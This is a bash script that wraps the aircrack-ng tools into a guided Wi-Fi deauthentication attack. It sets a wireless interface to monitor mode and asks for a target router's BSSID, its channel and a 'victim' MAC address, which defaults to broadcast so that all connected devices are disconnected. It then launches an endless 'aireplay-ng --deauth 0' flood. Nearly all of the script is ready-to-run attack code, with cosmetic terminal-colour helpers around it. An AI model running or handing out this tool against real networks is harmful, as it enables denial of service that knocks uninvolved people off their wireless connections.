#!/bin/bash

##---------------- FORMATING VARIABLES -------------
#Here are some variable for the text format. These variables uses escape sequences $
#In linux the escape sequences are \e, \033, \x1B
BLINK="\e[5m"
BOLD="\e[1m"
UNDERLINED="\e[4m"
INVERT="\e[7m"
HIDE="\e[8m"

BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
PURPLE="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

DARKGREY="\e[1;30m"
LIGHTRED="\e[1;31m"
LIGHTGREEN="\e[1;32m"
LIGHTYELLOW="\e[1;33m"
LIGHTBLUE="\e[1;34m"
LIGHTPURPLE="\e[1;35m"
LIGHTCYAN="\e[1;36m"
LIGHTWHITE="\e[1;37m"

UNDERRED="\e[41m"
UNDERGREEN="\e[42m"
UNDERWHITE="\e[107m"
UNDERGRAY="\e[47m"
UNDERCYAN="\e[46m"
UNDERYELLOW="\e[103m"

#Obv we need a control sequence that closes the rest control sequences
END="\e[0m"

TAB="\t"



##---------------- VARIABLES -------------
aircrackUpdate=1
interface=$1

##---------------- FUNCTIONS ----------------
programTerminated()
{
	#Erases the control sequence ^C when Ctrl+C is pressed
	echo -ne "\\r      \\n"

	echo "Exiting"
	echo ""

	#Stops the interface as monitoring
	airmon-ng stop $moninterface > /dev/null
	initFunction "Stoping $interface as monitoring interface..." "2" "0.05"

	#Deletes the sniffed packets
	rm /tmp/dwa_sniffed_packets* 2> /dev/null
	initFunction "Wiping temp files..." "2" "0.05"

	#Finished!
	echo "That's all! :)"
}

#Function for wait 12 seconds
waitFunction()
{
	#Hide the cursor to view the waiting bar without the backgorund color of the cursor
	tput civis

	#Bucle that repeats 3 times
	for count in [ 0..$aircrackUpdate ];
	do
		#Print compatible with format (-e) and without new line (-n).
		#With the \\r (\r carriage return) we erase the first char of the line,
		#so we can write another character in the same line without the prev char.
		echo -ne "| \\r"
		sleep 0.25
		echo -ne "/ \\r"
		sleep 0.25
		echo -ne "- \\r"
		sleep 0.25
		echo -ne "\ \\r"
		sleep 0.25
	done

	#Show again the cursor.
	tput cvvis

	#Erase the last character of the waitFunction and then go to the next line
	echo -ne " \\r\n"
}

#Function to show processes with uppers alternatively
initFunction()
{
	#Assing each argument to a variable.
	string=$1
	repeats=$2
	wait=$3

	#Sets all upper letters to lower.
	string=`echo -ne "$string\\r" | tr [[:upper:]] [[:lower:]]`

	#Hide the cursor
	tput civis

	#Repeat this bucle so many times of the value of the variable repeats
	for ((repeat=0;repeat<$repeats;repeat++))
	do
		#Sets the variable charNum to 0 (so we can enter to the next bucle)
		charNum=0

		#Count how many chars are in the variable string
		while (( charNum++ < ${#string} ))
		do
			#Sums une to the charNum variable and saves the result in the upperChars variable
			upperChars=`expr $charNum + 1`
			#The variable lowerChars will be the same as the variable charNum.
			lowerChars=`expr $charNum + 0`

			#So the result in the character five will be:
			#charNum: 5
			#upperChars: 6
			#lowerChars: 5


			#Repeat the point so many times as the value of the variables upperChars and lowerChars
			#The result for the previous example will be:
                        #upperChars: 6
                        #lowerChars: 5
                        #positionUpper: ......
                        #positionLower: .....
			positionUpper=`seq -s. $upperChars | tr -d '[:digit:]'`
			positionLower=`seq -s. $lowerChars | tr -d '[:digit:]'`

			#First, we pass the string to the first sed. This sed transform all dots in the variable to upper letters.
			#Each dot  represents one character of the string.
			#For example, for the string "barbecue", continuing with the previously example...
			#positionUpper: ......
			#string: BARBECue

			#Now we pass these string to the second sed. These sed do the same, but transforming the upper letters to
			#lower letters.
			#positionLower: .....
			#string: barbeCue

			#Finally colors the string.
			echo -ne $LIGHTRED
			echo -ne "$string\\r" | sed -e 's/\('"$positionUpper"'\)/\U\1/' | sed -e 's/\('"$positionLower"'\)/\L\1/'
			echo -ne $END

			#Time that each character sets to upper
			sleep $wait
		done
	done

	#Color the final string and sets all the string to lower
	echo -ne $BLUE
	echo -ne "$string\\r" | sed -e 's/\(*\)/\L\1/'
	echo -ne $END
	echo ""

	#Show the cursor
	tput cvvis
}

##---------------- SCRIPT ----------------
#trap programTerminated EXIT

clear

if [[ $interface != "wlan"* ]];
then
	echo -e $RED"Not a valid wlan interface selected"$END

	exit 1
fi

## --- STEP 1 ---
#Start the interface selected as monitoring interface. The output is discarded
echo -e $CYAN$BOLD"1"$END") Setting the interface as monitor mode..."

ip link set $interface down
iwconfig $interface mode monitor
ip link set $interface up

if [[ $(iwconfig $interface | grep -o "Mode:Monitor") == "" ]];
then
	echo -e $RED"The interface could not be set in the monitoring mode properly"$END

	exit 1
fi

echo ""
echo -e "New monitor interface -> " $CYAN$BOLD$BLINK$interface$END
echo ""

## --- STEP 2 ---
tmux select-pane -t 1

tmux send-keys "airodump-ng --update $aircrackUpdate $interface" C-m

tmux select-pane -t 0

echo -e $CYAN$BOLD"2"$END") Type the MAC (BSSID) and the channel that appears in the new window of the router where you want to scan for hosts:"
echo ""

#Read the MAC that the user want to AUDIT
echo -ne $BLINK" > "$END"BSSID: "$LIGHTYELLOW ; read bssid ; echo -ne "" $END

check_bssid=`echo -ne "$bssid" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

#While the format of the MAC ingressed by the user doesnt match, enter the bucle to repeat the question
while [[ "$bssid" != "$check_bssid" ]] || [[ "$bssid" == "" ]];
do
	#Asks again for a valid MAC
	echo -e "Enter a valid MAC address (BSSID). Example of the format: 0A:12:B0:34:3E:F2"
	echo ""
	echo -ne $BLINK" > "$END"BSSID: "$LIGHTYELLOW ; read bssid ; echo -ne "" $END

	#Re-save the format to identify one MAC address
	check_bssid=`echo -ne "$bssid" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

	#If the pattern match and could be a valid MAC, exit the bucle.
	if [[ "$bssid" == "$check_bssid" ]] && [[ "$bssid" != "" ]];
	then
		break
	fi
done

#Read the MAC that the user want to AUDIT
echo -ne $BLINK"\b > "$END"   CH: "$LIGHTYELLOW ; read channel ; echo -ne "" $END
echo ""

#While the channel is less than 1 and more than 14, or not contains nothing, enter the bucle to repeat the question
while [[ $channel -lt 1 || $channel -gt 14 || -z $channel || `echo $channel | grep [a-Z]` ]];
do
	#Asks again for a valid channel
	echo -e "Enter a valid channel (CH). Remember that the Wi-Fi channels goes between by 1 to 14."
	echo ""
	echo -ne $BLINK" > "$END"   CH: "$LIGHTYELLOW ; read channel ; echo -ne "" $END

	#If the channel goes between 1 and 14 and could be a valid channel, and contain something, exits the bucle.
	if [[ $channel -ge 1 && $channel -le 14 && -n $channel ]];
	then
		break
	fi
done

echo ""
echo -e "MAC of the target router -> " $CYAN$BOLD$BLINK$bssid$END
echo -e "Channel of the target router -> " $CYAN$BOLD$BLINK$channel$END
echo ""

## --- STEP 3 ---
#Now stop de monitoring interface and discard the output.
ip link set $interface down
#Inmediatly, start another time the interface as monitoring but in the same channel that is the router tou audit.
#If the interface is not in the same channel as the router, the interface cant inject packets properly
iwconfig $interface mode Monitor $channel

tmux select-pane -t 1

tmux send-keys "qq"
tmux send-keys "airodump-ng $interface --update $aircrackUpdate --bssid $bssid --channel $channel" C-m

tmux select-pane -t 0

echo -e $CYAN$BOLD"3"$END") Finally type the MAC of the device that you want to kick out of the wireless network."
echo -e "Press "$LIGHTYELLOW"ENTER"$END" to inject deauth packets to de broadcast MAC ("$CYAN$BOLD"FF:FF:FF:FF:FF:FF"$END"). This affects to all hosts connected to the network."

echo -ne $BLINK" > "$END"Victim MAC: "$LIGHTYELLOW ; read victimmac ; echo -ne "" $END
echo ""

#Saves the format to identify a MAC address
checkVictimmac=`echo -ne "$victimmac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

#If the variable is empty (user press enter)...
if [[ $victimmac == "" ]];
then
	victimmac=`echo $victimmac | sed 's/^$/FF:FF:FF:FF:FF:FF/g'`
	echo -e $LIGHTRED"Target to kick out -> " $BLINK"All devices (FF:FF:FF:FF:FF:FF)"$END

else
	############### response checker ###############
	#While the format of the MAC ingressed by the user doesnt match, enter the bucle to repeat the question
	while [[ $victimmac != $checkVictimmac ]];
	do
		#Asks again for a valid MAC
		echo ""
		echo -e "Enter a valid MAC address (STATION). Example of the format: 0A:12:B0:34:3E:F2"
		echo ""
		echo -ne $BLINK" > "$END"Victim MAC: "$LIGHTYELLOW ; read victimmac ; echo -ne "" $END
		echo ""

		#Re-save the format to identify one MAC address
		checkVictimmac=`echo -e "$victimmac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

		#If the pattern match and could be a valid MAC, exit the bucle.
		if [[ "$victimmac" == "$checkVictimmac" ]];
		then
			break
		fi
	done

	#Print that the attack is going to be done against the specified MAC.
	echo -e $LIGHTRED"Target to kick out -> " $BLINK$victimmac$END
fi

echo ""
initFunction "Initiating attack" "3" "0.1"
echo -e "                         \\r"

tmux detach-client

tmux select-pane -t 1

tmux send-keys "qq"
tmux send-keys "aireplay-ng --deauth 0 -c $victimmac -a $bssid $interface" C-m
